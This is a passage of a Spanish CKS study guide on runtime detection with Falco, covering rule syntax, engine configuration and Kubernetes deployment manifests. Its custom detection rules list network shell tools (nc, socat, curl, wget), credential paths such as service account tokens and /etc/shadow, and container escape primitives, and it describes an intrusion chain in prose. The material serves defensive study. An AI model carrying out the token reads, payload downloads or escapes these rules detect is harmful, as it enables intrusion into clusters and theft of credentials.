# CKS 6.1 — Realizar analítica de comportamiento para detectar actividades maliciosas

**Dominio:** Monitoring, Logging and Runtime Security (20%)
**Peso del ítem:** ~4% del examen
**Versión de Kubernetes objetivo:** v1.34

---

## 1. El problema en producción: por qué la postura estática no alcanza

Todo lo que endureciste en los dominios 1–5 es un control *previo a la ejecución*. RBAC decide quién puede crear un Pod. El control de admisión decide qué especificación de Pod es aceptable. La firma de imágenes decide qué bits pueden descargarse. seccomp y AppArmor deciden qué syscalls *tiene permitido* hacer el proceso.

Ninguno de ellos te dice qué **hizo realmente** el proceso después de que `containerd` le entregó el control al kernel.

La brecha es estructural, no una deficiencia de herramientas:

| Control | Evaluado cuando | Ciego a |
|---|---|---|
| RBAC | llega la petición a la API | cualquier cosa que no pase por kube-apiserver |
| ValidatingAdmissionPolicy / Pod Security Admission | creación/actualización del objeto | comportamiento en runtime de un Pod ya admitido |
| Escaneo de imágenes / verificación de firma | momento del pull | código descargado *después* del arranque (`curl \| sh`), payloads interpretados, LOLBins ya presentes en la imagen |
| NetworkPolicy | paquete en el datapath de la CNI | actividad de procesos dentro del contenedor, abuso a nivel de kernel |
| seccomp / AppArmor | por syscall, por archivo | syscalls *permitidas* usadas maliciosamente (`execve("/bin/sh")` es legal en el 99% de los perfiles) |

Un fallo concreto en producción que motiva todo este dominio:

> Un servicio Java es comprometido a través de un gadget de deserialización. El atacante nunca crea un Pod, nunca toca el API server, nunca descarga una imagen nueva. Lanza `/bin/sh` desde la JVM, lee `/var/run/secrets/kubernetes.io/serviceaccount/token`, escribe un binario estático en `/tmp`, le hace `chmod +x` y lo ejecuta. Cada una de esas operaciones está permitida por un perfil seccomp `RuntimeDefault` por defecto y por una NetworkPolicy de egress permisiva.

El único observador que vio todo eso fue el **kernel**. La analítica de comportamiento es la disciplina de instrumentar el kernel (y el API server, y el datapath de red), construir un modelo de lo "normal" para cada workload, y alertar ante la desviación.

### 1.1 Los tres planos de observación

Tenés que poder razonar sobre qué plano responde qué pregunta. Tanto las tareas del examen como los incidentes reales dependen de elegir el correcto.

| Plano | Fuente de verdad | Instrumentación | Responde |
|---|---|---|---|
| **Kernel / host** | syscalls, hooks LSM, tracepoints, kprobes | Falco, Tetragon, auditd, Sysdig, KubeArmor | *¿Qué hizo el proceso?* exec, open, connect, setuid, mount, ptrace, carga de módulos |
| **API de Kubernetes** | backend de auditoría de `kube-apiserver` | Audit Policy + audit log / webhook | *¿Quién le pidió qué al plano de control?* `exec` a un Pod, lectura de un secret, escalada de RBAC, Pod creado con `hostPID` |
| **Red** | registros de flujo, DNS, L7 | Cilium/Hubble, flow logs de Calico, sockets eBPF, service mesh | *¿Quién habló con quién?* baliza C2, movimiento lateral, volumen de exfiltración |

Una detección real casi siempre **correlaciona** planos. "Se lanzó una shell en `payments-api`" (kernel) es una señal de baja confianza. "Se lanzó una shell en `payments-api` **y** 40 segundos antes se registró un `kubectl exec` del usuario `dev-contractor` contra ese Pod" (auditoría de la API) es un incidente con un responsable. "Se lanzó una shell en `payments-api` **y** el contenedor abrió inmediatamente una conexión TCP a una dirección fuera de RFC1918 en el puerto 4444" (kernel + red) es una brecha.

### 1.2 Detección por firmas vs. baselining de comportamiento

Dos filosofías: el examen espera la primera, y producción necesita ambas.

| | Basado en reglas/firmas | Basado en baseline/anomalías |
|---|---|---|
| **Modelo** | expresión booleana escrita por humanos sobre campos de eventos | perfil aprendido de los conjuntos normales de syscall/exec/red |
| **Ejemplos** | reglas de Falco, reglas de auditd, TracingPolicy de Tetragon | grabaciones del Security Profiles Operator, `advise` de Inspektor Gadget, UEBA comercial |
| **Latencia hasta dar valor** | inmediata | necesita una ventana de observación limpia (horas–días) |
| **Falsos positivos** | predecibles, ajustables por regla | altos al principio, decaen a medida que el baseline madura |
| **Falsos negativos** | cualquier cosa que no anticipaste | comportamiento novedoso pero dentro del perfil |
| **Explicabilidad** | perfecta — la regla *es* la explicación | pobre — "esto difiere del baseline" |
| **Manejo del drift** | las reglas se pudren en silencio | el baseline debe regrabarse en cada release |
| **Relevancia para el examen** | **alta** — vas a escribir reglas de Falco | baja — pero los conceptos son terreno válido |

La síntesis productiva usada en plataformas maduras: **grabar** el comportamiento para derivar un baseline (SPO / Inspektor Gadget), **congelarlo** en un control que aplique (perfil seccomp/AppArmor), y **alertar** con reglas sobre el residual (Falco/Tetragon). El baselining reduce la superficie de ataque; las reglas atrapan lo que queda.

---

## 2. Falco: arquitectura que debés entender, no sólo configurar

Falco es el motor de seguridad en runtime graduado de la CNCF y es la herramienta que trae el entorno del examen CKS. Entender sus internals es lo que separa "copié una regla" de "puedo depurar por qué mi regla no disparó".

### 2.1 Camino de los datos

```
┌────────────────────────────────────────────────────────────────────┐
│ user space                                                         │
│                                                                    │
│   ┌──────────┐   ┌──────────────┐   ┌───────────────┐             │
│   │ libscap  │──▶│   libsinsp   │──▶│  rule engine  │──▶ outputs  │
│   │ (capture)│   │ (state, enr.)│   │ (filter eval) │   stdout    │
│   └────▲─────┘   └──────▲───────┘   └───────────────┘   file      │
│        │                │                                gRPC      │
│        │ mmap'd ring    │ container metadata             http      │
│        │ buffers        │ (container plugin / CRI)       program   │
└────────┼────────────────┼──────────────────────────────────────────┘
         │                │
┌────────┼────────────────┼──────────────────────────────────────────┐
│ kernel │                │                                          │
│   ┌────┴──────────────┐ │   ┌──────────────────────┐              │
│   │ modern eBPF (CO-RE)│ │   │ kmod (falco.ko)      │  ← pick one  │
│   │ or legacy eBPF     │ │   │                      │              │
│   └────────▲───────────┘ │   └──────────▲───────────┘              │
│            │             │              │                          │
│      raw_syscalls:sys_enter / sys_exit tracepoints, sched_process_*│
└────────────────────────────────────────────────────────────────────┘
```

Consecuencias clave de este diseño:

1. **Falco no es inline.** Observa desde ring buffers de forma *asíncrona*. Detecta; no bloquea por sí solo. (Falco Talon / motores de respuesta agregan reacción; Tetragon agrega enforcement dentro del kernel.)
2. **Los ring buffers pueden desbordarse.** Bajo tormentas de syscalls el kernel descarta eventos. Este es el fallo silencioso #1 en producción — cubierto en §7.3.
3. **El enriquecimiento de contenedor es un lookup en user space** contra el socket CRI. Si el socket no está montado, `%container.name` se degrada y los campos `k8s.*` quedan vacíos — el fallo silencioso #2.
4. **Falco sólo traza las syscalls que necesitan sus reglas cargadas.** Habilitar una regla que referencia una syscall no trazada sin ajustar `base_syscalls` produce cero eventos y ningún error.

### 2.2 Selección de driver — la primera decisión arquitectónica

| Driver (`engine.kind`) | Requisito de kernel | ¿Artefacto por kernel? | Riesgo de taint / panic del kernel | Overhead | Cuándo elegirlo |
|---|---|---|---|---|---|
| `modern_ebpf` | ≥ 5.8 (BPF ring buffer), BTF disponible | **No** — CO-RE, embebido en el binario de Falco | ninguno (verificado por el verifier) | el más bajo | **Por defecto en cualquier distro moderna.** RHEL 9, Ubuntu 22.04+, Talos, Bottlerocket |
| `ebpf` (probe legacy) | ≥ 4.14 | sí — `falco-bpf.o` compilado o descargado por kernel | ninguno | bajo | kernels viejos sin BTF; en vías de retiro |
| `kmod` | cualquiera con headers | sí — `falco.ko` compilado o descargado por kernel | **hace taint del kernel; un bug puede provocar panic en el nodo** | bajo | flotas legacy air-gapped, kernels < 4.14 |
| `gvisor` | n/a — lee los trace sinks de `runsc` | no | ninguno | moderado | workloads en sandbox sobre GKE Sandbox / runsc |
| `replay` | n/a | no | ninguno | n/a | análisis offline de una captura `.scap` — excelente para post-incidente y para testear reglas |

**BTF es la condición para `modern_ebpf`.** Verificalo antes de comprometerte:

```console
$ ls -l /sys/kernel/btf/vmlinux
-r--r--r--. 1 root root 5918471 Aug  5 09:12 /sys/kernel/btf/vmlinux

$ uname -r
5.15.0-118-generic
```

Si `/sys/kernel/btf/vmlinux` no está, el nodo se compiló sin `CONFIG_DEBUG_INFO_BTF=y` y tenés que caer a `ebpf` o `kmod`.

### 2.3 Anatomía del lenguaje de reglas

Un archivo de ruleset de Falco contiene cuatro tipos de objeto. El orden no importa; los nombres deben ser únicos por tipo.

```yaml
# ── required: declares which rules-file schema this file targets ──
- required_engine_version: 0.41.0

# ── LIST: a named set of literal values, expanded inline ──
- list: shell_binaries
  items: [ash, bash, csh, dash, fish, ksh, sh, tcsh, zsh]

# ── MACRO: a named, reusable boolean sub-expression ──
- macro: spawned_process
  condition: evt.type in (execve, execveat) and evt.dir = <

- macro: container
  condition: container.id != host

# ── RULE: condition + output + priority ──
- rule: Terminal shell in container
  desc: >
    An interactive shell was spawned inside a container with an attached TTY.
    Legitimate workloads do not do this; it is the signature of kubectl exec,
    an exploited RCE, or a debug sidecar left in production.
  condition: >
    spawned_process
    and container
    and proc.name in (shell_binaries)
    and proc.tty != 0
  output: >
    Shell spawned in container
    (evt_time=%evt.time user=%user.name uid=%user.uid
     proc=%proc.name cmdline=%proc.cmdline parent=%proc.pname
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: WARNING
  tags: [container, shell, mitre_execution, T1059]
  source: syscall
```

#### Referencia de campos que vas a usar de verdad

| Campo | Significado | Nota |
|---|---|---|
| `evt.time` | marca de tiempo legible por humanos | `evt.time.iso8601` para RFC3339, `evt.time.s` para segundos epoch |
| `evt.type` | nombre de la syscall (`execve`, `open`, `openat`, `connect`, `setuid`) | |
| `evt.dir` | `>` entrada, `<` salida | **las reglas de exec deben usar `<`**, si no `proc.name` sigue siendo el del *padre* |
| `evt.arg.*` / `evt.args` | argumentos de la syscall | p. ej. `evt.arg.flags contains O_WRONLY` |
| `proc.name` | basename del ejecutable | |
| `proc.exepath` | ruta absoluta resuelta | más robusto que `proc.name` frente a renombrados |
| `proc.cmdline` | línea de comandos completa | |
| `proc.pname` / `proc.aname[N]` | nombre del padre / del N-ésimo ancestro | `proc.aname[2]` = abuelo |
| `proc.tty` | TTY de control, `0` = ninguno | el discriminador de shell interactiva |
| `proc.pid`, `proc.ppid` | pids | |
| `user.name`, `user.uid`, `user.loginuid` | identidad | `loginuid` sobrevive a `su`/`sudo` en hosts |
| `group.gid` | gid primario | |
| `fd.name` | nombre de archivo/socket | `fd.sip`, `fd.sport`, `fd.rip`, `fd.rport` para sockets |
| `fd.directory`, `fd.filename` | ruta partida | |
| `container.id` | id corto del contenedor, o el literal `host` | |
| `container.name` | nombre del contenedor | |
| `container.image.repository` | imagen sin tag | `container.image.tag`, `container.image.digest` |
| `container.privileged` | booleano | |
| `k8s.ns.name`, `k8s.pod.name` | desde las labels de CRI | disponible **sin** el plugin k8smeta |
| `k8s.pod.label[app]`, `k8s.deployment.name` | **requiere el plugin `k8smeta` + k8s-metacollector** | trampa común del examen |

#### Operadores

`=` `!=` `<` `<=` `>` `>=` `contains` `icontains` `bcontains` `startswith` `endswith` `glob` `in (…)` `intersects (…)` `pmatch (…)` `exists` — combinados con `and` `or` `not` y paréntesis.

`pmatch` es una coincidencia de rutas sobre un árbol de prefijos y es dramáticamente más rápido que una lista de `startswith`:

```yaml
condition: fd.name pmatch (/etc, /usr/bin, /usr/sbin)
```

#### Prioridades (ordenadas, de mayor a menor)

`EMERGENCY` > `ALERT` > `CRITICAL` > `ERROR` > `WARNING` > `NOTICE` > `INFORMATIONAL` > `DEBUG`

La clave `priority:` de nivel superior en `falco.yaml` fija la severidad **mínima** que se carga y evalúa. Una regla en `DEBUG` en un clúster configurado con `priority: informational` nunca dispara — y Falco no dice nada. Este es el modo de fallo #3.

### 2.4 Sobrescritura de reglas (Falco ≥ 0.38)

El viejo `append: true` está deprecado. La forma moderna es explícita y mucho más segura, porque nombra *qué* atributo se está agregando o reemplazando.

```yaml
# Append an exclusion to an upstream rule without forking it
- rule: Terminal shell in container
  condition: and not k8s.ns.name in (debug-tools, ci-runners)
  override:
    condition: append

# Replace the output of an upstream rule entirely
- rule: Terminal shell in container
  output: "TTY shell %k8s.ns.name/%k8s.pod.name user=%user.name cmd=%proc.cmdline"
  priority: CRITICAL
  override:
    output: replace
    priority: replace

# Disable an upstream rule
- rule: Read sensitive file untrusted
  enabled: false
```

El mismo mecanismo funciona para macros y listas:

```yaml
- list: shell_binaries
  items: [busybox, nc, ncat]
  override:
    items: append
```

**El orden de carga importa.** Las sobrescrituras deben cargarse *después* de la regla que modifican — ponelas en `falco_rules.local.yaml` o en un archivo de `rules.d/` que ordene después, y confirmá el orden de `rules_files` en `falco.yaml`.

---

## 3. Despliegue completo de producción

### 3.1 Namespace, RBAC y service account

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: falco
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/audit: privileged
    pod-security.kubernetes.io/warn: privileged
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: falco
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: falco
  labels:
    app.kubernetes.io/name: falco
rules:
  # Required only by the k8smeta plugin / k8s-metacollector for owner-reference
  # enrichment (deployment name, pod labels). Omit if you do not deploy it.
  - apiGroups: [""]
    resources: ["pods", "namespaces", "replicationcontrollers", "services", "nodes"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["apps"]
    resources: ["daemonsets", "deployments", "replicasets", "statefulsets"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["batch"]
    resources: ["jobs", "cronjobs"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: falco
  labels:
    app.kubernetes.io/name: falco
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: falco
subjects:
  - kind: ServiceAccount
    name: falco
    namespace: falco
```

### 3.2 `falco.yaml` — la configuración del motor

```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-config
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
data:
  falco.yaml: |
    ############################
    # Rules files, in load order
    ############################
    rules_files:
      - /etc/falco/falco_rules.yaml           # upstream stable ruleset
      - /etc/falco/falco_rules.local.yaml     # local overrides / additions
      - /etc/falco/rules.d                    # directory, loaded lexicographically

    ############################
    # Driver
    ############################
    engine:
      kind: modern_ebpf
      kmod:
        buf_size_preset: 4
        drop_failed_exit: false
      ebpf:
        probe: ${HOME}/.falco/falco-bpf.o
        buf_size_preset: 4
        drop_failed_exit: false
      modern_ebpf:
        cpus_for_each_buffer: 2
        buf_size_preset: 4
        drop_failed_exit: false
      replay:
        capture_file: ""
      gvisor:
        config: ""
        root: ""

    ############################
    # Container metadata.
    # Falco >= 0.41 sources this from the `container` plugin. On <= 0.40 the
    # equivalent block is the top-level `container_engine:` key.
    ############################
    plugins:
      - name: container
        library_path: libcontainer.so
        init_config:
          label_max_len: 100
          with_size: false
          hooks: [1]
          engines:
            docker:   { enabled: true, sockets: ["/var/run/docker.sock"] }
            podman:   { enabled: true, sockets: ["/run/podman/podman.sock"] }
            containerd: { enabled: true, sockets: ["/run/containerd/containerd.sock"] }
            cri:      { enabled: true, sockets: ["/run/crio/crio.sock"] }
            lxc:      { enabled: false }
            libvirt_lxc: { enabled: false }
            bpm:      { enabled: false }
    load_plugins: [container]

    ############################
    # Minimum severity actually evaluated. Rules below this are NOT loaded.
    ############################
    priority: debug

    ############################
    # Output channels
    ############################
    json_output: true
    json_include_output_property: true
    json_include_tags_property: true
    json_include_message_property: false
    buffered_outputs: false          # false => flush per event; needed for exam-style file capture

    stdout_output:
      enabled: true

    file_output:
      enabled: true
      keep_alive: false
      filename: /var/log/falco/events.log

    syslog_output:
      enabled: false

    http_output:
      enabled: true
      url: "http://falcosidekick.falco.svc.cluster.local:2801/"
      user_agent: "falcosecurity/falco"
      insecure: false
      echo: false

    program_output:
      enabled: false
      keep_alive: false
      program: "jq '{text: .output}' | curl -d @- -X POST https://hooks.example/…"

    grpc:
      enabled: false
      bind_address: "unix:///run/falco/falco.sock"
      threadiness: 0
    grpc_output:
      enabled: false

    ############################
    # Health / metrics
    ############################
    webserver:
      enabled: true
      listen_port: 8765
      k8s_healthz_endpoint: /healthz
      prometheus_metrics_enabled: true
      threadiness: 0
      ssl_enabled: false

    metrics:
      enabled: true
      interval: 15m
      output_rule: true
      rules_counters_enabled: true
      resource_utilization_enabled: true
      state_counters_enabled: true
      kernel_event_counters_enabled: true
      libbpf_stats_enabled: true
      convert_memory_to_mb: true
      include_empty_values: false

    ############################
    # Drop / overload behaviour  ← read §7.3 before changing
    ############################
    syscall_event_drops:
      threshold: 0.1
      actions: [log, alert]
      rate: 0.03333
      max_burst: 1
      simulate_drops: false

    syscall_event_timeouts:
      max_consecutives: 1000

    ############################
    # Operational
    ############################
    watch_config_files: true         # hot-reload on rules/config change
    time_format_iso_8601: true
    log_stderr: true
    log_syslog: false
    log_level: info
    libs_logger:
      enabled: false
      severity: debug
    output_timeout: 2000
    outputs_queue:
      capacity: 0

    ############################
    # Syscall selection.
    # `repair: true` makes Falco compute the minimal set required by the loaded
    # rules and add the state-tracking syscalls libsinsp needs. Prefer this over
    # a hand-written custom_set.
    ############################
    base_syscalls:
      custom_set: []
      repair: true
```

### 3.3 ConfigMap de reglas personalizadas

```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-rules-custom
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
data:
  90-custom-rules.yaml: |
    - required_engine_version: 0.41.0

    ####################################################################
    # Lists
    ####################################################################
    - list: known_shell_binaries
      items: [ash, bash, csh, dash, fish, ksh, sh, tcsh, zsh, busybox]

    - list: package_mgmt_binaries
      items: [apt, apt-get, dpkg, yum, dnf, rpm, apk, microdnf, pip, pip3, npm, gem]

    - list: network_recon_binaries
      items: [nc, ncat, netcat, nmap, socat, dig, nslookup, host, tcpdump, curl, wget]

    - list: sensitive_credential_paths
      items:
        - /var/run/secrets/kubernetes.io/serviceaccount
        - /etc/shadow
        - /etc/kubernetes/pki
        - /root/.kube/config
        - /root/.ssh
        - /var/lib/kubelet/pki

    - list: trusted_debug_namespaces
      items: [falco, kube-system, sre-breakglass]

    ####################################################################
    # Macros
    ####################################################################
    - macro: spawned_process
      condition: evt.type in (execve, execveat) and evt.dir = <

    - macro: in_container
      condition: container.id != host

    - macro: open_write
      condition: >
        evt.type in (open, openat, openat2)
        and evt.is_open_write = true
        and fd.typechar = f
        and fd.num >= 0

    - macro: open_read
      condition: >
        evt.type in (open, openat, openat2)
        and evt.is_open_read = true
        and fd.typechar = f
        and fd.num >= 0

    - macro: outbound_connection
      condition: >
        evt.type = connect
        and evt.dir = <
        and fd.l4proto = tcp
        and fd.sockfamily = ip

    - macro: private_destination
      condition: >
        fd.rnet in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8")

    ####################################################################
    # Rules
    ####################################################################

    # ---- T1059 Command and Scripting Interpreter -------------------
    - rule: Interactive shell spawned in container
      desc: >
        A shell with a controlling TTY was executed inside a container. This is
        the runtime signature of `kubectl exec -it`, of an exploited RCE that
        upgraded to a PTY, or of a forgotten debug sidecar.
      condition: >
        spawned_process
        and in_container
        and proc.name in (known_shell_binaries)
        and proc.tty != 0
        and not k8s.ns.name in (trusted_debug_namespaces)
      output: >
        Interactive shell in container
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline
         tty=%proc.tty container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: WARNING
      tags: [container, shell, mitre_execution, T1059]
      source: syscall

    # ---- T1552.001 Credentials In Files ----------------------------
    - rule: Service account token read by unexpected process
      desc: >
        A process other than the language runtime or an in-cluster client read
        the projected service account token. Post-exploitation reconnaissance
        almost always starts here.
      condition: >
        open_read
        and in_container
        and fd.name pmatch (/var/run/secrets/kubernetes.io/serviceaccount)
        and proc.name in (known_shell_binaries, network_recon_binaries, cat, head, tail, base64, xxd, od, strings)
      output: >
        ServiceAccount token accessed by suspicious process
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         proc=%proc.name cmdline=%proc.cmdline file=%fd.name
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, secrets, mitre_credential_access, T1552.001]
      source: syscall

    # ---- Container drift: new executable written then executed -----
    - rule: New executable written to container filesystem
      desc: >
        A file was created or truncated for writing under a directory that is
        normally read-only in an immutable container. Combined with the drift
        exec rule below this detects "download and run" payloads.
      condition: >
        open_write
        and in_container
        and fd.name pmatch (/bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /tmp, /dev/shm, /var/tmp)
        and not proc.name in (package_mgmt_binaries)
      output: >
        Executable path written inside container
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         proc=%proc.name cmdline=%proc.cmdline file=%fd.name
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: NOTICE
      tags: [container, drift, mitre_persistence, T1105]
      source: syscall

    - rule: Drifted binary executed in container
      desc: >
        A process executed a binary that was not present in the container image
        (upper layer of the overlayfs). This is the highest-signal container
        drift detection available from syscalls alone.
      condition: >
        spawned_process
        and in_container
        and proc.is_exe_upper_layer = true
      output: >
        Binary not in container image was executed (container drift)
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         exe=%proc.exepath cmdline=%proc.cmdline parent=%proc.pname
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, drift, mitre_execution, T1204]
      source: syscall

    # ---- T1611 Escape to Host --------------------------------------
    - rule: Container escape primitive observed
      desc: >
        A container invoked a syscall that is only useful for breaking the
        namespace boundary: mount, setns, unshare, kernel module load, or a
        write to a well-known cgroup escape path.
      condition: >
        in_container
        and (
          (spawned_process and proc.name in (nsenter, unshare, mount, umount, insmod, modprobe, rmmod))
          or (evt.type in (mount, umount2, setns, unshare, init_module, finit_module) and evt.dir = <)
          or (open_write and fd.name pmatch (/sys/fs/cgroup, /proc/sys/kernel/core_pattern, /sys/kernel/uevent_helper))
        )
      output: >
        Possible container escape attempt
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         evt=%evt.type proc=%proc.name cmdline=%proc.cmdline file=%fd.name
         privileged=%container.privileged container=%container.name
         image=%container.image.repository ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, escape, mitre_privilege_escalation, T1611]
      source: syscall

    # ---- T1071 C2 beacon -------------------------------------------
    - rule: Outbound connection to public IP from recon tool
      desc: >
        A network utility inside a container opened a TCP connection to a
        non-private address. Legitimate application traffic uses the language
        runtime's own socket code, not curl/nc.
      condition: >
        outbound_connection
        and in_container
        and not private_destination
        and proc.name in (network_recon_binaries)
      output: >
        Recon/transfer tool connected to public address
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         proc=%proc.name cmdline=%proc.cmdline
         dest=%fd.rip:%fd.rport conn=%fd.name
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: WARNING
      tags: [container, network, mitre_command_and_control, T1071]
      source: syscall

    # ---- T1548 setuid abuse ----------------------------------------
    - rule: Privilege escalation to root inside container
      desc: >
        A non-root process transitioned to uid 0 inside a container. With
        allowPrivilegeEscalation=false and NoNewPrivs this should be impossible.
      condition: >
        evt.type in (setuid, setresuid) and evt.dir = <
        and in_container
        and evt.arg.uid = 0
        and user.uid != 0
      output: >
        Process escalated to root inside container
        (time=%evt.time.iso8601 from_uid=%user.uid from_user=%user.name
         proc=%proc.name cmdline=%proc.cmdline parent=%proc.pname
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, privesc, mitre_privilege_escalation, T1548]
      source: syscall

    ####################################################################
    # Overrides of upstream rules (must load AFTER falco_rules.yaml)
    ####################################################################
    - rule: Read sensitive file untrusted
      condition: and not proc.name in (node_exporter, kubelet, fluent-bit)
      override:
        condition: append
```

### 3.4 El DaemonSet

```yaml
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
    app.kubernetes.io/component: runtime-security
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: falco
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
  template:
    metadata:
      labels:
        app.kubernetes.io/name: falco
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8765"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: falco
      priorityClassName: system-node-critical
      hostNetwork: true
      hostPID: true
      dnsPolicy: ClusterFirstWithHostNet
      terminationGracePeriodSeconds: 30
      tolerations:
        - operator: Exists
      containers:
        - name: falco
          image: docker.io/falcosecurity/falco-no-driver:0.41.0
          imagePullPolicy: IfNotPresent
          args:
            - /usr/bin/falco
            - -pk                     # append k8s.* fields to output
          securityContext:
            privileged: false
            runAsUser: 0
            readOnlyRootFilesystem: false
            allowPrivilegeEscalation: true
            capabilities:
              # Least-privilege set for the modern_ebpf driver.
              # For `kmod` you need privileged: true instead.
              drop: ["ALL"]
              add:
                - SYS_ADMIN          # required by the container plugin for /proc introspection
                - SYS_RESOURCE       # raise RLIMIT_MEMLOCK for BPF maps
                - SYS_PTRACE         # read /proc/<pid> of other namespaces
                - BPF                # bpf() syscall
                - PERFMON            # attach to tracepoints
          env:
            - name: HOST_ROOT
              value: /host
            - name: FALCO_HOSTNAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: FALCO_K8S_NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
          resources:
            requests:
              cpu: 100m
              memory: 512Mi
            limits:
              cpu: "1"
              memory: 1Gi
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8765
            initialDelaySeconds: 60
            periodSeconds: 15
            timeoutSeconds: 5
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /healthz
              port: 8765
            initialDelaySeconds: 30
            periodSeconds: 15
            timeoutSeconds: 5
            failureThreshold: 3
          volumeMounts:
            - name: config
              mountPath: /etc/falco/falco.yaml
              subPath: falco.yaml
              readOnly: true
            - name: rules-custom
              mountPath: /etc/falco/rules.d
              readOnly: true
            - name: proc-fs
              mountPath: /host/proc
              readOnly: true
            - name: etc-fs
              mountPath: /host/etc
              readOnly: true
            - name: boot-fs
              mountPath: /host/boot
              readOnly: true
            - name: lib-modules
              mountPath: /host/lib/modules
              readOnly: true
            - name: sys-fs
              mountPath: /sys/kernel/debug
            - name: containerd-socket
              mountPath: /run/containerd/containerd.sock
              readOnly: true
            - name: crio-socket
              mountPath: /run/crio/crio.sock
              readOnly: true
            - name: docker-socket
              mountPath: /var/run/docker.sock
              readOnly: true
            - name: falco-logs
              mountPath: /var/log/falco
      volumes:
        - name: config
          configMap:
            name: falco-config
            items:
              - key: falco.yaml
                path: falco.yaml
        - name: rules-custom
          configMap:
            name: falco-rules-custom
        - name: proc-fs
          hostPath:
            path: /proc
        - name: etc-fs
          hostPath:
            path: /etc
        - name: boot-fs
          hostPath:
            path: /boot
        - name: lib-modules
          hostPath:
            path: /lib/modules
        - name: sys-fs
          hostPath:
            path: /sys/kernel/debug
        - name: containerd-socket
          hostPath:
            path: /run/containerd/containerd.sock
            type: SocketOrCreate
        - name: crio-socket
          hostPath:
            path: /run/crio/crio.sock
            type: SocketOrCreate
        - name: docker-socket
          hostPath:
            path: /var/run/docker.sock
            type: SocketOrCreate
        - name: falco-logs
          hostPath:
            path: /var/log/falco
            type: DirectoryOrCreate
```

> **Variante `kmod`.** Si BTF no está disponible, cambiá `engine.kind` a `kmod`, poné `securityContext.privileged: true` (descartando la lista de capabilities), y agregá al principio este initContainer:
>
> ```yaml
>       initContainers:
>         - name: falco-driver-loader
>           image: docker.io/falcosecurity/falco-driver-loader:0.41.0
>           imagePullPolicy: IfNotPresent
>           args: ["falcoctl", "driver", "install"]
>           securityContext:
>             privileged: true
>           env:
>             - name: HOST_ROOT
>               value: /host
>             - name: FALCOCTL_DRIVER_KIND
>               value: kmod
>           volumeMounts:
>             - name: lib-modules
>               mountPath: /host/lib/modules
>             - name: boot-fs
>               mountPath: /host/boot
>               readOnly: true
>             - name: etc-fs
>               mountPath: /host/etc
>               readOnly: true
>             - name: usr-fs
>               mountPath: /host/usr
>               readOnly: true
>             - name: driver-dir
>               mountPath: /root/.falco
> ```

### 3.5 Falcosidekick: enrutar alertas por prioridad

Las salidas propias de Falco son tuberías tontas. Falcosidekick es la capa de fan-out que convierte prioridades en decisiones de enrutamiento.

```yaml
---
apiVersion: v1
kind: Secret
metadata:
  name: falcosidekick-secrets
  namespace: falco
type: Opaque
stringData:
  SLACK_WEBHOOKURL: "https://hooks.slack.com/services/REPLACE/ME"
  ALERTMANAGER_HOSTPORT: "http://alertmanager-operated.monitoring.svc:9093"
  LOKI_HOSTPORT: "http://loki-gateway.monitoring.svc"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: falcosidekick
  namespace: falco
  labels:
    app.kubernetes.io/name: falcosidekick
spec:
  replicas: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: falcosidekick
  template:
    metadata:
      labels:
        app.kubernetes.io/name: falcosidekick
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "2801"
        prometheus.io/path: "/metrics"
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1234
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: falcosidekick
          image: docker.io/falcosecurity/falcosidekick:2.31.1
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 2801
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
          env:
            - name: DEBUG
              value: "false"
